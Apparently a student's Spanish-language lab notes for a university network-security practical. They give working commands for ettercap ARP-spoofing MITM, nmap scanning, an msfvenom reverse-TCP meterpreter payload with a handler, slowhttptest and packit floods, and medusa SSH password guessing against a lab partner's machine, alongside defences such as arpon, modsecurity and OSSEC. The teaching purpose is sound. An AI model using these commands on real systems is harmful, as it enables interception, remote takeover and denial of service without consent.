Id Máquina Virtual: 3.2.7-49.47
IP Máquina: 10.11.49.47
IP Máquina Compañero: 10.11.49.48
Usuario: lsi 

_El objetivo de esta práctica es comprender y probar el funcionamiento de los sniffers, los ataques DDoS, así como diversos temas relacionados con lo que hemos llamado la trilogía (“host discovery”, “port scanning” y “fingerprinting”). La gestión de la información de auditoría es otro de los objetivos de esta práctica. En las sesiones de laboratorio se propondrán posibles herramientas a utilizar._
## Información básica de la máquina

2 tarjetas de red: ens33 10.11.49.47 y ens34 10.11.51.47

SSH por puerto 22
HTTP por puerto 80
HTTPS por puerto 443
NTP por puerto 123
rsyslog por puerto 514

## Información básica de ataques y terminología

**Envenenamiento ARP/ARP poisoning/ARP spoofing** -> Ataque MITM en el que se intercepta un ARP request de una máquina y lo emplea para indicarle a la misma y al router (o solo a la máquina) que las direcciones MAC involucradas se asocian con su IP, y dichas asociaciones quedan guardadas en sus respectivos cachés ARP, de forma que toda la paquetería pase por la máquina.

**DoS** -> Denial of Service. Ataques que buscan saturar ciertos servicios, usualmente mediante el envío una gran cantidad de paquetería, a través de una máquina. En está 

**DDoS** -> Distributed Denial of Service. Similar a DoS, salvo que se emplean múltiples máquinas comprometidas (botnet) para realizar el ataque.

**DDoS reflective attack** -> Se mandan muchas peticiones a servidores modificadas para que parezca que una victima las está realizando, con la intención de saturarla

**MITM** -> Siglas de Man In The Middle. Ataques de intercepción.

**ICMP Redirect** -> Mensajes empleados principalmente por routers para indicar rutas más óptimas por las que pasar paquetes. Puede ser explotado para que una máquina víctima asigne a la máquina del atacante como default gateway.

**WAF** -> Web Application Firewall

## Práctica

##### a) Instale el ettercap y pruebe sus opciones básicas en línea de comando.

Para instalar el programa ejecutamos el comando:

```shell
apt install ettercap-text-only
```

Como hemos instalado la versión sin interfaz gráfica, es conveniente conocer la estructura y funcionamiento de los comandos de ettercap:

> Formato: ettercap opciones target1 target2

Un ejemplo sería el comando:

```shell
ettercap -i ens33 -Tq -P repoison_arp -w /home/lsi/Escritorio/archivo -M arp:remote /ip compañero// /ip router//
```

A continuación mostramos una breve explicación de las opciones:

**-i ens33** -> Especifica la interfaz de red que empleamos para realizar el ataque, en este caso ens33

**-Tq** -> indica que el comando se ejecuta en modo texto y que no muestre los contenidos por la terminal

**-M arp:remote** -> Indica el ataque a realizar, en este caso un ataque de ARP poisoning entre una máquina y un router

**-P repoison_arp** -> Especifica el plugin que empleamos, en este caso repoison_arp. Este plugin en concreto

**-w /home/lsi/Escritorio/archivo** -> especifica el archivo en el que se guarda la información

**-F** -> Opción no presente en el ejemplo, pero que determina los filtros a aplicar

Los targets se determinan con el formato **Dirección MAC/Dirección IPv4/ Dirección IPv6/Puerto**, por lo que si determinamos el target mediante una dirección IPv4 **y tenemos IPv6 activado** se escribe con /dir IPv4//

Finalmente, es necesario recordar que <strong><u>debemos salir de ettercap pulsando q</u></strong>

##### b) Capture paquetería variada de su compañero de prácticas que incluya varias sesiones HTTP. Sobre esta paquetería (puede utilizar el wireshark para los siguientes subapartados):
1. Identifique los campos de cabecera de un paquete TCP 
2. Filtre la captura para obtener el tráfico HTTP 
3. Obtenga los distintos “objetos” del tráfico HTTP (imágenes, pdfs, etc.) 
4. Visualice la paquetería TCP de una determinada sesión. 
5. Sobre el total de la paquetería obtenga estadísticas del tráfico por protocolo como fuente de información para un análisis básico del tráfico. 
6. Obtenga información del tráfico de las distintas “conversaciones” mantenidas. 
7. Obtenga direcciones finales del tráfico de los distintos protocolos como mecanismo para determinar qué circula por nuestras redes. 

Para realizar este apartado correctamente debemos instalar wireshark en nuestro equipo. Este programa está disponible para todos los sistemas operativos.

A continuación realizamos un ataque de ARP Spoofing:

```shell
ettercap -i ens33 -Tq -P remote_browser -w /home/lsi/Escritorio/archivo -M arp:remote /ip compañero// /ip router//
```

Mientras que el la víctima usa un navegador de texto (como lynx).

Después se exporta el archivo a nuestro equipo y se abre con Wireshark.
##### c) Obtenga la relación de las direcciones MAC de los equipos de su segmento. 

Para obtener la tabla de las direcciones MAC de la máquina se ejecuta el comando:

```shell
arp -a
```

Y para obtener las MACs de las máquinas de la red usamos:

```shell
ping -b 10.11.49.255 #No recomendable
```

o:

```shell
nmap -sP 10.11.48.0/23
```

##### d) Obtenga la relación de las direcciones IPv6 de su segmento. 

Para ehacerlo por direct link ejecutamos:

```shell
ping6 -I ens33 -c 3 ff02::1
```

y obtenemos la tabla de relaciones con:

```shell
ip -6 neigh
```

Otra opción es usando ThcIPv6:

```shell
apt install thc-ipv6
```

Y usamos alive6:

```shell
atk6-alive6 ens33
```

##### e) Obtenga el tráfico de entrada y salida legítimo de su interface de red ens33 e investigue los servicios, conexiones y protocolos involucrados. 

Para capturar el tráfico legítimo de nuestra máquina usaremos el comando tcpdump:

```shell
apt install tcpdump
```

Y almacenamos paquetería en un archivo:

```shell
tcpdump -w mitrafico.pcap
```

Tras terminas en nuestra máquina recibimos una copia del archivo con:

```shell
scp lsi@ip:/home/lsi/Escritorio/mitrafico.pcap C:/Directiorio/Destino
```

Y lo analizamos con la herramienta Wireshark.

Para emplear esta herramienta debemos instalar (preferiblemente) la última versión del programa (en nuestro caso mediante el instalador para Windows), y una vez

##### f) Mediante arpspoofing entre una máquina objetivo (víctima) y el router del laboratorio obtenga todas las URL HTTP visitadas por la víctima. 

Ejecutamos ettercap:

```shell
ettercap -i ens33 -Tq -P remote_browser -w /home/lsi/Escritorio/archivo.cap -M arp:remote /ip compañero// /ip router//
```

mientras el compañero navega con el navegador lynx y emplea los comandos curl y wget:

```shell
 wget http://www.squid-cache.org/Images/img4.jpg
```

Tras terminar el ataque en nuestra máquina recibimos una copia del archivo con:

```shell
scp lsi@ip:/home/lsi/Escritorio/archivo.cap C:/Directiorio/Destino
```

Y lo analizamos con la herramienta Wireshark.

##### g) Instale metasploit. Haga un ejecutable que incluya un Reverse TCP meterpreter payload para plataformas linux. Inclúyalo en un filtro ettercap y aplique toda su sabiduría en ingeniería social para que una víctima u objetivo lo ejecute. 

Descargamos e instalamos el instalador:

```shell
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
```

```shell
chmod +x msfinstall #damos permisos de ejecución al script
```

```shell
./msfinstall
```

Comprobamos la versión de metasploit:

```shell
msfconsole --version
```

Una vez tengamos instalado metasploit creamos el payload:

```shell
msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=10.11.49.47 lport=4444 -f elf -o rshell.elf
```

Le asignamos permisos de ejecución:

```shell
chmod +x rshell.elf
```

y lo comprimimos:

```shell
zip compressed.zip rshell.elf
```

Hacemos que el compañero lo ejecute en su máquina mientras ejecutamos lo siguiente:

```shell
msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > set lhost 10.11.49.47
msf6 exploit(multi/handler) > set lport 4444
msf6 exploit(multi/handler) > exploit
#esperamos a que la víctima ejecute
```

Mientras el compañero tenga el programa en ejecución tendremos total control de la máquina.

##### h) Haga un MITM en IPv6 y visualice la paquetería. 



##### i) Pruebe alguna herramienta y técnica de detección del sniffing (preferiblemente arpon). 

Instalamos arpon:

```shell
apt install arpon
```

e incluímos en el fichero /etc/arpon.conf las IPs del router, del compañero y la nuestra junto con sus respectivas direcciones MAC.

Para activar arpon se ejecuta:

```shell
systemctl start arpon@ens33 #no uses enable
```

y para detenerlo:

```shell
systemctl stop arpon@ens33
```

##### j) Pruebe distintas técnicas de host discovery, port scanning y OS fingerprinting sobre las máquinas del laboratorio de prácticas en IPv4. Realice alguna de las pruebas de port scanning sobre IPv6. ¿Coinciden los servicios prestados por un sistema con los de IPv4? 

Para escaneo de puertos usaremos nmap:

```shell
nmap -sS -p 1-100 IPcompañero
```

o:

```shell
nmap -sU -p 1-100 IPcompañero
```

para escanear los puertos del 1 al 100 de la máquina de nuestro compañero, y:

```shell
nmap -sL 193.144.51.0/24
```

para conocer los nombres de dominio de todas las direcciones de la red mediante resolución inversa (DNS) **No lo hagais con otras redes, esta es propia de la udc para este tipo de cosas. PROBAR ESTO CON OTRAS REDES PUEDE TENER CONSECUENCIAS**.

También puedes ejecutar:

```shell
nmap -sV IPcompañero
```

para hacer además fingerprinting a todos los puertos de la máquina.

Por otra parte podemos usar :

```shell
nmap -O IPcompañero
```

Para hacer OS fingerprinting, y podemos añadir:

```shell
--osscan-guess
```

para forzar al programa a mostrar una estimación si no se puede determinar claramente con la información de la que dispone.

Finalmente, podemos realizar escaneos con IPv6 con el comando:

```shell
nmap -6 -p 22, 80 -n IPv6%ens33
```

##### k) Obtenga información “en tiempo real” sobre las conexiones de su máquina, así como del ancho de banda consumido en cada una de ellas. 

Para la monitorización de red podemos usar los siguientes comandos:

```shell
iftop -i ens33
```

```shell
vnstat -l -i ens33 #recomendado
```

De esta forma obtienes las tasas de emisión y recepción en bytes/s y paquetes/s. El ancho de banda consumido total es la suma de rx y tx totales.

##### l) Monitorizamos nuestra infraestructura: 
1. Instale prometheus y node_exporter y configúrelos para recopilar todo tipo de métricas de su máquina linux. 
2. Posteriormente instale grafana y agregue como fuente de datos las métricas de su equipo de prometheus. 
3. Importe vía grafana el dashboard 1860. 
4. En los ataques de los apartados m y n busque posibles alteraciones en las métricas visualizadas. 



##### m) PARA PLANTEAR DE FORMA TEÓRICA.: ¿Cómo podría hacer un DoS de tipo direct attack contra un equipo de la red de prácticas? ¿Y mediante un DoS de tipo reflective flooding attack? 

Un ataque DoS directo consiste en realizar un gran número de conexiones a la máquina víctima (servidor o máquina normal) con la intención de sobrepasar la capacidad de la misma para atenderlas.

Un DoS reflective consiste en mandar muchas paquetes de conexión modificados a un servidor para que la dirección de origen de los paquetes sea la máquina víctima, con la intención de que se desborde con las respuestas del servidor.

##### n) Ataque un servidor apache instalado en algunas de las máquinas del laboratorio de prácticas para tratar de provocarle una DoS. Utilice herramientas DoS que trabajen a nivel de aplicación (capa 7). ¿Cómo podría proteger dicho servicio ante este tipo de ataque? ¿Y si se produjese desde fuera de su segmento de red? ¿Cómo podría tratar de saltarse dicha protección? 

Instalamos la herramienta slowhttptest:

```shell
apt install slowhttptest
```

Y ejecutamos un comando con una estructura similar al siguiente:

```shell
slowhttptest -c 1000 -g -X -o slow-file -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://IPcompañero -p 3
```

Expliquemos las opciones del comando:

**-c 1000** -> Establece el número de conexiones que se van a realizar, en este caso 1000

**-g** -> Activa la generación de gráficos

**-X** -> Indica el tipo de peticiones HTTP que se van a usar para el ataque. Las opciones son:
1. **-X** -> para usar peticiones GET
2. **-H** -> para usar peticiones HEAD
3. **-B** -> para usar peticiones POST

**-o slow-file** -> para indicar que los datos se guardarán en el archivo indicado

**-r 200** -> Indica el número de conexiones que se establecerán por segundo (200 en este caso)

**-w 512 -y 1024** -> ventana de la petición inicial + tamaño de los datos posteriores

**-n 5** -> intervalo en segundos de lectura de los datos almacenados en el buffer

**-z 32** -> tiempo en segundos para que se cierren las conexiones en caso de inactividad

**-k 3** -> número de veces que se repite la petición por conexión

**-u http:// IPcompañero** -> Dirección del servidor víctima

**-p 3** -> Intervalo en segundos entre peticiones HTTP

Otra herramienta útil es packit, para realizar floodeos sync:

```shell
apt install packit
```

Y ejecutamos un comando con una estructura similar al siguiente:

```shell
packit -c 0 -b 0 -s 10.11.48.200 -d 10.11.48.100 -FS -S 1000 -D 22 -sR 
```

para Flood directo, o:

```shell
packit -c 0 -b 0 -s IPorigen -dR -FS -S 22 -D 80
```

para un ataque reflective

**-c 0 -b 0** -> No hay límite del número de paquetes ni del burst

**-s Iporigen -d Ipdestino** -> direcciones de origen y destino, respetcívamente

**-FS** -> Se usan paquetes con el flag SYN activado

**-S 1000 -D 22** -> puertos de origen y destino, respectivamente

**-dR** -> Reflects (mandan las respuestas al origen)
##### o) Instale y configure modsecurity. Vuelva a proceder con el ataque del apartado anterior. ¿Qué acontece ahora? 

Vamos a instalar modsecurity con:

```shell
apt install libapache2-mod-security2
```

modificamos el archivo /etc/apache2/apache2.conf:

```bash
ServerName    nombredemiserver.es #puede ponerse lsi.es
```

el compañero debe incluir en el archivo /etc/hosts:

```bash
IPcompa   nombredemiserver.es #no incluir nombre de server de la propia máquina
```

para evitar el error "No Qualified Server Name", y modificamos el archivo /etc/modsecurity/modsecurity.conf-recomended, de forma que los datos sean los siguientes:

```bash
SetRuleEngine On

SecCommEngine On
SecCommWriteStateLimit 40 #número de cónexiones simultáneas de escritura
SecCommReadStateLimit 40 #número de cónexiones simultáneas de lectura
```

finalmente reiniciamos el servicio:

```shell
systemctl restart apache2
```

Activamos el modsecurity con:

```shell
a2enmod security2
```

y lo desactivamos con:

```shell
a2dismod security2
```

<strong><u>Modsecurity no protege contra ataques read (usando GET)</u></strong>

##### p) Buscamos información: 
1. Obtenga de forma pasiva el direccionamiento público IPv4 e IPv6 asignado a la Universidade da Coruña. 
2. Obtenga información sobre el direccionamiento de los servidores DNS y MX de la Universidade da Coruña. 
3. ¿Puede hacer una transferencia de zona sobre los servidores DNS de la UDC? En caso negativo, obtenga todos los nombres.dominio posibles de la UDC. 
4. ¿Qué gestor de contenidos se utiliza en www.usc.es? 



##### q) Trate de sacar un perfil de los principales sistemas que conviven en su red de prácticas, puertos accesibles, fingerprinting, etc. 



##### r) Realice algún ataque de “password guessing” contra su servidor ssh y compruebe que el analizador de logs reporta las correspondientes alarmas. 

Vamos a usar medusa para realizar password guessing:

```shell
apt install medusa
```

Creamos un fichero dic.txt con las posibles contraseñas.

El comando que vamos a usar tiene el siguiente formato:

```shell
medusa -h IPcompi -u lsi -P dic.txt -M ssh -f
```

**-h IPcompi** -> dirección del host víctima

**-u lsi** -> usuario del host

**-P dic.txt** -> diccionario a usar

**-M ssh** -> protocolo de conexión a emplear

**-f** -> indica que termine el ataque al encontrar una combinación correcta

Comprueba que el log de inicio de sesión:

```shell
tail -n 50 /var/log/auth.log
```

para ver las últimas 50 líneas del fichero

##### s) Reportar alarmas está muy bien, pero no estaría mejor un sistema activo, en lugar de uno pasivo. Configure algún sistema activo, por ejemplo OSSEC, y pruebe su funcionamiento ante un “password guessing”. 

Descargamos e instalamos el zip:

```shell
wget https://github.com/ossec/ossec-hids/archive/refs/heads/master.zip
```

```shell
unzip master.zip
```

```shell
./install.sh
```

Tras ejecutar el archivo se abre un menú de instalación en el que seleccionaremos las siguientes opciones:

>Se instala en modo local
>El directorio se mantiene el por defecto
>Se mandan correos de aviso por e-mail (a lsi@localhost)
>Se habilita el servidor de integridad
>Se activa la detección de rootkits
>Se activa la respuesta activa
>Desechar en el firewall
>No se añaden direcciones a la lista blanca

Al seleccionar las opciones pueden salir errores, lo que indica que faltan paquetes. Se instalan y se repite la instalación (si no estás seguro de qué falta, copia el error y pregunta a chatgpt).

Para iniciar ossec:

```shell
/var/ossec/bin/ossec-control start
```

y para detenerlo:

```shell
/var/ossec/bin/ossec-control stop
```

Comprueba las reglas del firewall con:

```shell
iptables -L
```

Y miramos las respuestas del Ossec con:

```shell
tail /var/ossec/logs/active-responses.log
```

##### t) Supongamos que una máquina ha sido comprometida y disponemos de un fichero con sus mensajes de log. Procese dicho fichero con OSSEC para tratar de localizar evidencias de lo acontecido (“post mortem”). Muestre las alertas detectadas con su grado de criticidad, así como un resumen de las mismas.


##### Por hacer

**grafana, prometheus, node_exporter**

**perfilar con nmap firewall, ip del compañero y servidor DHCP**

**filtro etter para metasploit**